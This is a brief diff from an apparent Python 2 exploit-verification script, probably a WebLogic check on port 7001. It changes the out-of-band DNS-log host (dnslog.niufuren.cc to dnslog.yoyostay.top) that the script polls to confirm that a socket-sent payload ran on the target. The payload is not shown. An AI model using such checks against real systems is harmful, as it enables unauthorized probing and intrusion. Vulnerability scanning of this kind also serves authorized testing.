@@ -39,7 +39,7 @@ def verify(ip, port=7001, name='', timeout=10):
         s.send(payload)
         s.close()
         time.sleep(5)
-        dnslog = 'http://dnslog.niufuren.cc/api/dns/devil/{}/'.format(random_num)
+        dnslog = 'http://dnslog.yoyostay.top/api/dns/devil/{}/'.format(random_num)
         req = urllib2.Request(dnslog)
         reqopen = urllib2.urlopen(req)
         if 'True' in reqopen.read():
